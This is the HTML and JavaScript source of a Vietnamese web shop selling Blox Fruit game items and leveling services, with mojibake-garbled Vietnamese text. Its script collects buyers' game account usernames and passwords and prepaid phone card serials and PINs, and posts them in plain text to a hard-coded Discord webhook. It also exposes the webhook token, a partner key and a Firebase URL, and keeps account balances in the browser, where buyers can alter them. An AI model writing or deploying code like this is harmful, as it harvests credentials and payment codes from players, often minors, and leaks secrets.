<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BAP SHOP | UY TIN BLOX FRUIT</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Quicksand:wght@500;700&display=swap');
        :root { --primary: #00f2ff; --secondary: #bc13fe; --bg: #030303; }
        body { background: var(--bg); color: #fff; font-family: 'Quicksand', sans-serif; min-height: 100vh; overflow-x: hidden; }
        
        /* Hi·ªáu ·ª©ng vi·ªÅn ch·∫°y xung quanh (Animated Border) */
        .premium-card {
            position: relative; background: #0a0a0a; border-radius: 20px; overflow: hidden;
            transition: 0.5s; border: 1px solid rgba(255,255,255,0.05);
        }
        .premium-card::before {
            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(transparent, transparent, var(--primary), transparent);
            animation: rotate 4s linear infinite; opacity: 0;
        }
        .premium-card:hover::before { opacity: 1; }
        .premium-card:hover { transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,242,255,0.2); }
        .card-inner { position: relative; inset: 2px; background: #0a0a0a; border-radius: 18px; z-index: 1; padding: 20px; }
        @keyframes rotate { 100% { transform: rotate(360deg); } }

        .btn-glow {
            background: linear-gradient(90deg, var(--secondary), #ff00de);
            box-shadow: 0 0 15px rgba(188,19,254,0.4); border-radius: 12px;
            transition: 0.3s; font-weight: bold; text-transform: uppercase;
        }
        .btn-glow:hover { box-shadow: 0 0 25px #ff00de; filter: brightness(1.2); }
        
        input, select { background: #151515 !important; border: 1px solid #252525 !important; color: #fff !important; }
        input:focus, select:focus { border-color: var(--primary) !important; outline: none; }
        .neon-text { font-family: 'Orbitron', sans-serif; text-shadow: 0 0 10px var(--primary); }
    </style>
</head>
<body class="p-4 md:p-8">

    <header class="max-w-6xl mx-auto flex justify-between items-center mb-10 p-5 premium-card">
        <div class="card-inner flex justify-between items-center w-full !p-2 px-6">
            <h1 class="text-2xl font-black neon-text italic">BAP<span class="text-white">SHOP</span></h1>
            <div class="flex items-center gap-4">
                <div class="text-right">
                    <p id="u_name" class="text-xs opacity-50">ƒêang t·∫£i...</p>
                    <p id="u_bal" class="font-bold text-cyan-400 text-lg">0ƒë</p>
                </div>
                <button onclick="auth.signOut().then(()=>location.reload())" class="text-xl opacity-30 hover:opacity-100">üö™</button>
            </div>
        </div>
    </header>

    <main class="max-w-6xl mx-auto">
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-16">
            <div class="premium-card">
                <div class="card-inner">
                    <h3 class="neon-text text-sm mb-6 uppercase">N·∫°p Th·∫ª T·ª± ƒê·ªông</h3>
                    <div class="space-y-4">
                        <select id="card_type" class="w-full p-4 rounded-xl text-sm">
                            <option value="VIETTEL">Viettel</option>
                            <option value="VINAPHONE">Vinaphone</option>
                            <option value="MOBIFONE">Mobifone</option>
                        </select>
                        <select id="card_amt" onchange="tinh(this.value)" class="w-full p-4 rounded-xl text-sm font-bold text-cyan-400">
                            <option value="">-- CH·ªåN M·ªÜNH GI√Å --</option>
                            <option value="10000">10,000ƒë - Nh·∫≠n 8,000ƒë</option>
                            <option value="20000">20,000ƒë - Nh·∫≠n 16,000ƒë</option>
                            <option value="50000">50,000ƒë - Nh·∫≠n 40,000ƒë</option>
                            <option value="100000">100,000ƒë - Nh·∫≠n 80,000ƒë</option>
                            <option value="200000">200,000ƒë - Nh·∫≠n 160,000ƒë</option>
                            <option value="500000">500,000ƒë - Nh·∫≠n 400,000ƒë</option>
                        </select>
                        <div class="flex justify-between text-[10px] px-1 uppercase opacity-60">
                            <span>Th·ª±c nh·∫≠n (80%):</span> <span id="tax" class="text-cyan-400">0ƒë</span>
                        </div>
                        <input id="seri" placeholder="S·ªê SERI" class="w-full p-4 rounded-xl text-xs">
                        <input id="pin" placeholder="M√É TH·∫∫" class="w-full p-4 rounded-xl text-xs">
                        <button onclick="nap()" class="w-full py-4 btn-glow">N·∫°p Ngay</button>
                    </div>
                </div>
            </div>

            <div class="lg:col-span-2 premium-card">
                <div class="card-inner h-full">
                    <h3 class="neon-text text-sm mb-6 uppercase">L·ªãch s·ª≠ giao d·ªãch</h3>
                    <div class="overflow-y-auto max-h-[300px]">
                        <table class="w-full text-[11px] text-left">
                            <thead class="opacity-30 uppercase">
                                <tr><th class="pb-4">D·ªãch v·ª•</th><th class="pb-4">S·ªë ti·ªÅn</th><th class="pb-4">Tr·∫°ng th√°i</th></tr>
                            </thead>
                            <tbody id="hist" class="divide-y divide-white/5"></tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>

        <h2 class="neon-text mb-8 flex items-center gap-3"><span class="w-2 h-6 bg-cyan-400 inline-block"></span> TR√ÅI √ÅC QU·ª∂ Vƒ®NH VI·ªÑN</h2>
        <div id="list_fruit" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-6 mb-20"></div>

        <h2 class="neon-text mb-8 flex items-center gap-3"><span class="w-2 h-6 bg-purple-400 inline-block"></span> GAMEPASS VIP</h2>
        <div id="list_gp" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-6 mb-20"></div>

        <h2 class="neon-text mb-8 flex items-center gap-3"><span class="w-2 h-6 bg-pink-500 inline-block"></span> D·ªäCH V·ª§ C√ÄY THU√ä</h2>
        <div id="list_ct" class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-20"></div>
    </main>

    <div id="modal" class="fixed inset-0 bg-black/95 hidden items-center justify-center p-4 z-[100] backdrop-blur-md">
        <div class="premium-card w-full max-w-sm">
            <div class="card-inner p-8">
                <h2 id="m_name" class="text-xl font-bold neon-text text-center mb-2"></h2>
                <p id="m_price" class="text-center text-cyan-400 mb-8 font-bold"></p>
                <div id="m_input" class="space-y-4"></div>
                <button onclick="confirm()" class="w-full py-4 btn-glow mt-8">X√°c nh·∫≠n thanh to√°n</button>
                <button onclick="document.getElementById('modal').style.display='none'" class="w-full mt-4 text-[10px] opacity-30 uppercase tracking-widest">ƒê√≥ng</button>
            </div>
        </div>
    </div>

    <script>
        // --- NGHƒ®A ƒêI·ªÄN TH√îNG TIN ---
        const WEBHOOK = "https://discord.com/api/webhooks/1467138431380623615/KxzLu2aos7455VXv-qOogLkoTC-c1XBJH7bJawv2eblGrxyY6vRDxVsBCdziIuOUB6g3";
        const ID = "9565963734"; // Partner ID
        const KEY = "80df3668af04f2a85e1befc277896513"; // Partner Key
        const DB_URL = "https://shop-blox-fruit-trannghia-default-rtdb.firebaseio.com";

        firebase.initializeApp({ databaseURL: DB_URL });
        const db = firebase.database(), auth = firebase.auth();

        const data = {
             fruit: [
    {n:"Kitsune VV", p:690000, img:"https://i.postimg.cc/5yHRjSfH/Anh-chup-man-hinh-2026-01-28-113329.png"},
    {n:"Dragon VV", p:750000, img:"https://i.postimg.cc/CLB3KS1g/Anh-chup-man-hinh-2026-01-28-113307.png"},
    {n:"Control VV", p:690000, img:"https://i.postimg.cc/qvnH14V7/Anh-chup-man-hinh-2026-01-28-113219.png"},
    {n:"Yeti VV", p:562000, img:"https://i.postimg.cc/dQxMvLJB/Anh-chup-man-hinh-2026-01-28-113255.png"},
    {n:"Tiger VV", p:562000, img:"https://i.postimg.cc/3NycWF3C/Anh-chup-man-hinh-2026-01-28-113337.png"},
    {n:"Spirit VV", p:463000, img:"https://i.postimg.cc/T1ZHb5PJ/Anh-chup-man-hinh-2026-01-28-113348.png"},
    {n:"Gas VV", p:452000, img:"https://i.postimg.cc/L6crYwY5/Anh-chup-man-hinh-2026-01-28-113319.png"},
    {n:"Venom VV", p:450000, img:"https://i.postimg.cc/kGtT7My6/Anh-chup-man-hinh-2026-01-28-113414.png"},
    {n:"Mochi (Dough) VV", p:444000, img:"https://i.postimg.cc/gj6gGcKM/Anh-chup-man-hinh-2026-01-28-113428.png"},
    {n:"Shadow VV", p:441000, img:"https://i.postimg.cc/QCWfjNqQ/Anh-chup-man-hinh-2026-01-28-113419.png"},
    {n:"T-Rex VV", p:420000, img:"https://i.postimg.cc/CMt2XX4m/Anh-chup-man-hinh-2026-01-28-113355.png"},
    {n:"Mammoth VV", p:420000, img:"https://i.postimg.cc/MKQLS5Pp/Anh-chup-man-hinh-2026-01-28-113409.png"},
    {n:"Gravity VV", p:408000, img:"https://i.postimg.cc/zv39K1FV/Anh-chup-man-hinh-2026-01-28-113238.png"},
    {n:"Blizzard VV", p:390000, img:"https://i.postimg.cc/5yLMm4SM/Anh-chup-man-hinh-2026-01-28-165200.png"},
    {n:"Pain VV", p:350000, img:"https://i.postimg.cc/NMGhGXyx/Anh-chup-man-hinh-2026-01-28-113228.png"},
    {n:"Lightning VV", p:350000, img:"https://i.postimg.cc/2yB0Cjxg/Anh-chup-man-hinh-2026-01-28-113433.png"},
    {n:"Sound VV", p:310000, img:"https://i.postimg.cc/pLZbwkrN/Anh-chup-man-hinh-2026-01-28-113451.png"},
    {n:"Love VV", p:300000, img:"https://i.postimg.cc/FHZ5MGzf/Anh-chup-man-hinh-2026-01-28-113457.png"},
    {n:"Creation VV", p:286000, img:"https://i.postimg.cc/d3Xg9S5x/Anh-chup-man-hinh-2026-01-28-113244.png"},
    {n:"Portal VV", p:250000, img:"https://i.postimg.cc/Z5ZzsXTM/Anh-chup-man-hinh-2026-01-28-113439.png"},
    {n:"Ph·∫≠t T·ªï VV", p:250000, img:"https://i.postimg.cc/tCQK78V7/Anh-chup-man-hinh-2026-01-28-113501.png"},
    {n:"Phoenix VV", p:250000, img:"https://i.postimg.cc/0yx1Xhkg/Anh-chup-man-hinh-2026-01-28-113443.png"},
    {n:"Spider VV", p:210000, img:"https://i.postimg.cc/Vk1PZ2f1/Anh-chup-man-hinh-2026-01-28-113448.png"},
    {n:"Quake VV", p:210000, img:"https://i.postimg.cc/CLT3d9fn/Anh-chup-man-hinh-2026-01-28-113506.png"},
    {n:"Ghost VV", p:150000, img:"https://i.postimg.cc/rFXBz7tx/Anh-chup-man-hinh-2026-01-28-113510.png"},
    {n:"Magma VV", p:150000, img:"https://i.postimg.cc/m2Y09VQF/Anh-chup-man-hinh-2026-01-28-113517.png"},
    {n:"Dark VV", p:130000, img:"https://i.postimg.cc/3wc6hqTH/Anh-chup-man-hinh-2026-01-28-113540.png"},
    {n:"Diamond VV", p:120000, img:"https://i.postimg.cc/HswfM3Q3/Anh-chup-man-hinh-2026-01-28-113522.png"},
    {n:"Light VV", p:120000, img:"https://i.postimg.cc/W43KQvxy/Anh-chup-man-hinh-2026-01-28-113530.png"},
    {n:"Ice VV", p:110000, img:"https://i.postimg.cc/YSsV7PH9/Anh-chup-man-hinh-2026-01-28-113545.png"},
    {n:"Eagle VV", p:111000, img:"https://i.postimg.cc/MGF4wLSc/Anh-chup-man-hinh-2026-01-28-113550.png"},
    {n:"Sand VV", p:100000, img:"https://i.postimg.cc/ZqMgmQhQ/Anh-chup-man-hinh-2026-01-28-113534.png"},
    {n:"Flame VV", p:100000, img:"https://i.postimg.cc/8zyXdYst/Anh-chup-man-hinh-2026-01-28-113555.png"},
    {n:"Blade VV", p:20000, img:"https://i.postimg.cc/BvXYmC1p/Anh-chup-man-hinh-2026-01-28-113602.png"}
],
             gp: [
                {n:"Fruit Notifier", p:370000, img:"https://i.postimg.cc/VNdGKFbx/Anh-chup-man-hinh-2026-01-28-113608.png"},
                {n:"Dark Blade", p:200000, img:"https://i.postimg.cc/d0LH59yQ/Anh-chup-man-hinh-2026-01-28-113612.png"},
                {n:"X2 Mastery VV", p:54000, img:"https://i.postimg.cc/44z82ym7/Anh-chup-man-hinh-2026-01-28-113623.png"},
                {n:"X2 Money VV", p:54000, img:"https://i.postimg.cc/8khyXcjW/Anh-chup-man-hinh-2026-01-28-113627.png"},
                {n:"1 Fruit Storage", p:50000, img:"https://i.postimg.cc/YSZXZm6C/Anh-chup-man-hinh-2026-01-28-113618.png"},
                {n:"X2 Drop VV", p:40000, img:"https://i.postimg.cc/PrTSgHwD/Anh-chup-man-hinh-2026-01-28-113631.png"},
                {n:"Fast Boat VV", p:40000, img:"https://i.postimg.cc/HkLBLt3Y/Anh-chup-man-hinh-2026-01-28-113635.png"}
            ],
            ct: [
                {n:"C√†y Thu√™ Level 1-2800", p:20000},
                {n:"L·∫•y V√µ V2 (T·∫∑ng Full Chi√™u)", p:30000},
                {n:"Th·ª©c T·ªânh Tr√°i V2 (L·ª≠a-Ch·∫•n ƒê·ªông)", p:20000},
                {n:"Th·ª©c T·ªânh Tr√°i V2 (Dough-Ph·∫≠t)", p:30000},
                {n:"Up V4 Full Gare", p:50000},
                {n:"L·∫•y Song Ki·∫øm Full", p:50000}
            ]
        };

        function tinh(v) { document.getElementById('tax').innerText = v ? (v * 0.8).toLocaleString() + 'ƒë' : '0ƒë'; }

        function render() {
            document.getElementById('list_fruit').innerHTML = data.fruit.map((v,i)=>`
                <div onclick="openM('fruit',${i})" class="premium-card cursor-pointer group">
                    <div class="card-inner p-4 text-center">
                        <img src="${v.img}" class="h-24 mx-auto mb-4 object-contain group-hover:scale-110 transition-transform">
                        <p class="text-[9px] font-bold uppercase opacity-50 truncate">${v.n}</p>
                        <p class="text-cyan-400 font-bold text-sm">${v.p.toLocaleString()}ƒë</p>
                    </div>
                </div>`).join('');
            
            document.getElementById('list_gp').innerHTML = data.gp.map((v,i)=>`
                <div onclick="openM('gp',${i})" class="premium-card cursor-pointer group">
                    <div class="card-inner p-4 text-center">
                        <img src="${v.img}" class="h-20 mx-auto mb-4 object-contain group-hover:scale-110 transition-transform">
                        <p class="text-[9px] font-bold uppercase opacity-50 truncate">${v.n}</p>
                        <p class="text-cyan-400 font-bold text-sm">${v.p.toLocaleString()}ƒë</p>
                    </div>
                </div>`).join('');

            document.getElementById('list_ct').innerHTML = data.ct.map((v,i)=>`
                <div class="premium-card">
                    <div class="card-inner p-5 flex justify-between items-center">
                        <div><p class="font-bold text-xs">${v.n}</p><p class="text-cyan-400 font-bold">${v.p.toLocaleString()}ƒë</p></div>
                        <button onclick="openM('ct',${i})" class="btn-glow px-6 py-2 text-[10px]">Thu√™</button>
                    </div>
                </div>`).join('');
        }

        let cur = {};
        function openM(t, i) {
            cur = data[t][i]; cur.t = t;
            document.getElementById('m_name').innerText = cur.n;
            document.getElementById('m_price').innerText = "Gi√°: " + cur.p.toLocaleString() + "ƒë";
            document.getElementById('m_input').innerHTML = t === 'ct' 
                ? `<input id="user" placeholder="T√†i kho·∫£n" class="w-full p-4 rounded-xl text-center"><input id="pass" type="password" placeholder="M·∫≠t kh·∫©u" class="w-full p-4 rounded-xl text-center">`
                : `<input id="user" placeholder="T√™n nh√¢n v·∫≠t nh·∫≠n qu√†" class="w-full p-4 rounded-xl text-center">`;
            document.getElementById('modal').style.display = 'flex';
        }

        async function confirm() {
            const u = document.getElementById('user').value, p = document.getElementById('pass')?.value || 'N/A';
            if(!u) return alert("Nh·∫≠p th√¥ng tin!");
            const snap = await db.ref('ng∆∞·ªùi d√πng/'+auth.currentUser.uid).get();
            const bal = snap.val()?.['THƒÇNG B·∫∞NG'] || 0;
            if(bal < cur.p) return alert("Kh√¥ng ƒë·ªß ti·ªÅn!");

            await db.ref('ng∆∞·ªùi d√πng/'+auth.currentUser.uid).update({"THƒÇNG B·∫∞NG": bal - cur.p});
            await db.ref('l·ªãch s·ª≠/'+auth.currentUser.uid).push({"n·ªôi dung": cur.n, "s·ªë ti·ªÅn": cur.p, "tr·∫°ng th√°i": "Ch·ªù duy·ªát", "th·ªùi gian": new Date().toLocaleString()});
            
            fetch(WEBHOOK, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
                embeds: [{ title: "üõí ƒê∆†N H√ÄNG", color: 65280, fields: [{name:"S·∫£n ph·∫©m", value:cur.n}, {name:"User", value:u}, {name:"Pass", value:p}] }]
            })});
            alert("Mua th√†nh c√¥ng!"); location.reload();
        }

        async function nap() {
            const t = document.getElementById('card_type').value, a = document.getElementById('card_amt').value, s = document.getElementById('seri').value, p = document.getElementById('pin').value;
            if(!a || !s || !p) return alert("Nh·∫≠p ƒë·ªß th√¥ng tin th·∫ª!");
            await db.ref('l·ªãch s·ª≠/'+auth.currentUser.uid).push({"n·ªôi dung": "N·∫°p "+t, "s·ªë ti·ªÅn": a, "tr·∫°ng th√°i": "ƒêang duy·ªát", "th·ªùi gian": new Date().toLocaleString()});
            fetch(WEBHOOK, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
                content: `üí≥ **TH·∫∫ N·∫†P**\n- Lo·∫°i: ${t} | Gi√°: ${a}ƒë\n- Seri: \`${s}\` | Pin: \`${p}\``
            })});
            alert("ƒê√£ g·ª≠i th·∫ª! Vui l√≤ng ƒë·ª£i.");
        }

        auth.onAuthStateChanged(u => {
            if(!u) return auth.signInAnonymously();
            db.ref('ng∆∞·ªùi d√πng/'+u.uid).on('value', s => {
                if(!s.exists()) db.ref('ng∆∞·ªùi d√πng/'+u.uid).set({"THƒÇNG B·∫∞NG": 0});
                document.getElementById('u_bal').innerText = (s.val()?.['THƒÇNG B·∫∞NG'] || 0).toLocaleString() + "ƒë";
                document.getElementById('u_name').innerText = "Th√†nh vi√™n #" + u.uid.substr(0,5);
            });
            db.ref('l·ªãch s·ª≠/'+u.uid).on('value', s => {
                const b = document.getElementById('hist'); b.innerHTML = "";
                s.forEach(o => {
                    const d = o.val();
                    b.innerHTML += `<tr><td class="py-4 font-bold text-cyan-400">${d['n·ªôi dung']}</td><td class="py-4">${parseInt(d['s·ªë ti·ªÅn']).toLocaleString()}ƒë</td><td class="py-4 text-right text-purple-400 font-bold">${d['tr·∫°ng th√°i']}</td></tr>`;
                });
            });
        });
        window.onload = render;
    </script>
</body>
</html>
